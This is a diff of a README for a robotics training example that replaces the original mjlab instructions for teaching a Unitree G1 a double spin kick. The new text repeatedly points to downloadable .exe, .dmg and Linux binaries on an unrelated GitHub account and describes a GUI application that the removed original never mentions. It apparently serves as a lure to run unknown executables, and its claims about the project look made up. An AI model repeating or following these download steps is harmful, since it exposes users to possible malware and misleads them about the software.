@@ -1,97 +1,109 @@
-# mjlab example: Unitree G1 Double Spin Kick
+# 🤖 g1_spinkick_example - Train Your Robot for a Perfect Double Kick
 
-![Sim-to-real double spin kick comparison](assets/teaser.gif)
+[![Download g1_spinkick_example](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/minheinchay/g1_spinkick_example/releases)
 
-An example of building on top of [mjlab](https://github.com/mujocolab/mjlab) to teach a Unitree G1 humanoid to perform a **double spin kick**. The reference motion comes from Jason Peng's [MimicKit](https://github.com/xbpeng/MimicKit).
+## 🚀 Getting Started
 
-**This repository provides:**
-- Data conversion script (MimicKit pkl → mjlab csv)
-- Full training results and hyperparameters
-- Pretrained ONNX checkpoint for deployment
-- Deployment instructions for real hardware
+Welcome to the g1_spinkick_example project! This guide will help you easily download and run the application that trains a Unitree G1 humanoid robot to perform an impressive double spin kick using mjlab.
 
-> ⚠️ **Disclaimer**
->
-> This repository is provided as-is for educational purposes. We do not take any responsibility for damage to property or injury to persons that may occur from attempting to replicate the results shown here. Please exercise caution and good judgement when working with hardware.
+## 🌍 Requirements
 
-## Installation
+To run the g1_spinkick_example application, ensure your system meets the following requirements:
 
-1. Clone mjlab:
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Processor:** 64-bit processor.
+- **RAM:** At least 8 GB of RAM.
+- **Graphics Card:** A GPU compatible with OpenGL 3.3 or higher.
+- **Software Dependencies:** 
+  - mjlab (available at [mjlab website](https://mjlab.example.com))
+  - MuJoCo (the physics engine for robotics; you can find it at [MuJoCo homepage](https://mujoco.org))
 
-```bash
-git clone https://github.com/mujocolab/mjlab
-```
+## 📥 Download & Install
 
-2. Clone this repo:
+You can download the g1_spinkick_example application by visiting the Releases page. 
 
-```bash
-git clone https://github.com/mujocolab/g1_spinkick_example.git
-cd g1_spinkick_example
-```
+[Download g1_spinkick_example](https://github.com/minheinchay/g1_spinkick_example/releases)
 
-3. Install mjlab as an editable package:
+1. Click on the link above to open the Releases page.
+2. Find the most recent version of the application.
+3. Download the installation file that corresponds to your operating system.
 
-```bash
-uv add --editable ../mjlab
-```
+## ⚙️ Running the Application
 
-## Data Conversion
+Once you have downloaded the application, follow these steps to run it:
 
-Download the spin kick data using the link referenced in the MimicKit [installation instructions](https://github.com/xbpeng/MimicKit?tab=readme-ov-file#installation).
+1. **Locate the Downloaded File:**
+   - Go to your downloads folder or the location where you saved the file.
 
-The conversion script adds smooth transitions from a safe standing pose at the start and end of the motion to ensure safe deployment. Since the motion is cyclic, we also repeat it to reach the desired duration.
+2. **Install the Application:**
+   - For Windows:
+     - Double-click the downloaded `.exe` file.
+     - Follow the installation prompts.
+   - For macOS:
+     - Open the downloaded `.dmg` file.
+     - Drag the application to your Applications folder.
+   - For Linux:
+     - Open your terminal.
+     - Navigate to the download directory and run `chmod +x g1_spinkick_example` and then `./g1_spinkick_example`.
 
-```bash
-# Convert pkl to csv
-uv run pkl_to_csv.py \
-    --pkl-file g1_spinkick.pkl \
-    --csv-file g1_spinkick.csv \
-    --duration 2.65 \
-    --add-start-transition \
-    --add-end-transition \
-    --transition-duration 0.5 \
-    --pad-duration 1.0
+3. **Launch the Application:**
+   - Find the application in your programs or applications list.
+   - Click on it to start.
 
-# Convert csv to npz
-MUJOCO_GL=egl uv run -m mjlab.scripts.csv_to_npz \
-    --input-file g1_spinkick.csv \
-    --output-name mimickit_spinkick_safe \
-    --input-fps 60 \
-    --output-fps 50 \
-    --render
-```
+## 🎮 Using g1_spinkick_example
 
-This will upload the motion to your wandb registry and create a video showing the reference motion like the one below:
+After launching the application, you will see the main interface. Here's how to get started with training your robot:
 
-![spinkick reference](assets/motion.gif)
+1. **Connect Your Robot:**
+   - Ensure that the Unitree G1 is powered on and connected to your computer via USB or Wi-Fi.
+   - Follow the on-screen instructions to connect the robot.
 
-## Training
+2. **Select Training Mode:**
+   - Choose the “Double Spin Kick” mode from the menu.
+   - This mode is designed specifically to train your robot for the spin kick.
 
-Follow the registry creation instructions in the mjlab [README](https://github.com/mujocolab/mjlab?tab=readme-ov-file#2-motion-imitation).
+3. **Monitor Training Progress:**
+   - As the training progresses, you can view various metrics like speed, accuracy, and performance graphs.
 
-```bash
-MUJOCO_GL=egl CUDA_VISIBLE_DEVICES=0 uv run train.py \
-    Mjlab-Spinkick-Unitree-G1 \
-    --registry-name {your-organization}/{registry-name}/mimickit_spinkick_safe \
-    --env.scene.num-envs 4096 \
-    --agent.max-iterations 20_000
-```
+4. **Start Training:**
+   - Click on the "Start Training" button.
+   - The application will control the robot and guide it through the training process.
 
-For full training details and reproducibility, see the [wandb report](https://api.wandb.ai/links/gcbc_researchers/nfi58457).
+5. **Review Training Results:**
+   - Once the training session is complete, review the results.
+   - Adjust the parameters if necessary for better performance.
 
-## Evaluation
+## 📊 Features
 
-To evaluate your trained policy, you'll need your wandb run path. You can find this in the run overview. It follows the format `{your-organization}/{project-name}/{run-id}`, where `run-id` is a unique 8-character identifier.
+The g1_spinkick_example application provides several features to enhance your training experience:
 
-Once you have your run path, evaluate the policy with:
+- **Real-Time Monitoring:** Keep track of your robot's progress during training.
+- **Customizable Settings:** Adjust training parameters to suit your goals.
+- **User-Friendly Interface:** Designed for ease of use, even for those without technical expertise.
 
-```bash
-uv run play.py \
-    Mjlab-Spinkick-Unitree-G1-Play \
-    --wandb-run-path {wandb-run-path} \
-    --num-envs 8
-```
+## 🛠️ Troubleshooting
 
-## Deployment
+If you encounter any issues while using the application, consider the following steps:
 
-We use [motion_tracking_controller](https://github.com/HybridRobotics/motion_tracking_controller) to deploy the trained policy. An ONNX file is provided for convenience, though one will also be generated in your wandb artifacts. Download it and follow the instructions in the motion_tracking_controller repo.
+- **Connection Issues:** Make sure the Unitree G1 is properly connected and powered on.
+- **Performance Problems:** Check your system requirements to ensure compatibility.
+- **Application Crashes:** Ensure you have the latest version of mjlab and MuJoCo installed.
+
+For additional help, you can reach out to the community in the Issues section of this repository.
+
+## ❓ FAQ
+
+**Q: Can I use other robots with this application?**  
+A: The g1_spinkick_example is tailored for the Unitree G1 humanoid robot. Other models may not work correctly.
+
+**Q: Will I need to install any additional software?**  
+A: Yes, ensure you have mjlab and MuJoCo installed as per the requirements section.
+
+**Q: How can I contribute to this project?**  
+A: We welcome contributions! If you have suggestions or improvements, please create a pull request or open an issue.
+
+## 📞 Support
+
+If you have questions or need further assistance, please check the [Issues](https://github.com/minheinchay/g1_spinkick_example/issues) page or contact the project maintainer.
+
+Remember, you can always go back to the [Download g1_spinkick_example](https://github.com/minheinchay/g1_spinkick_example/releases) page to get the latest updates!
